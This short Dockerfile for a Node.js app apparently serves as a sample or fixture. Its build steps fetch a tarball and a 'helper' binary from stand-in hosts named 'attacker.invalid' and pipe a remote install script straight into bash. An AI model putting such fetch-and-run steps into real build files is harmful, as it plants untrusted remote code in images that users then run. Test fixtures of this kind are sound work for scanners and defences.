FROM node:latest
ADD https://cdn.attacker.invalid/tool.tar.gz /opt/tool.tar.gz
RUN curl -sSL https://get.attacker.invalid/install.sh | bash
RUN wget -O /usr/local/bin/helper https://cdn.attacker.invalid/helper && chmod +x /usr/local/bin/helper
COPY . /app
CMD ["node", "/app/src/index.js"]
